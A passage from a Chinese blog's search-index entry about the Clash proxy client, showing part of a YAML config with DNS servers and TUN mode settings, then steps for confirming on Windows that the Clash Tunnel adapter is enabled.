enhanced-mode: redir-host</span><br><span class="line">    nameserver:</span><br><span class="line">    - 119.29.29.29</span><br><span class="line">    - 223.5.5.5</span><br><span class="line">    - 223.6.6.6</span><br><span class="line">  tun:</span><br><span class="line">    enable: true</span><br><span class="line">    stack: gvisor</span><br><span class="line">    dns-hijack:</span><br><span class="line">    - 198.18.0.2:53</span><br><span class="line">    macOS-auto-route: true</span><br><span class="line">    macOS-auto-detect-interface: true</span><br></pre></td></tr></table></figure><p>全都配置完后，打开<code>控制面板</code> &gt; <code>网络和 Internet</code> &gt; <code>网络和共享中心</code> &gt; 左侧<code>更改适配器设置</code>，找到名称为<code>Clash</code>且描述为<code>Clash Tunnel</code>的适配器，如果显示已启用，说明tap模式成功开启</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211203175920217.png" alt="image-20211203175920217"></p><p>最后记得想要全部代理流量，选全局！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Clash </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
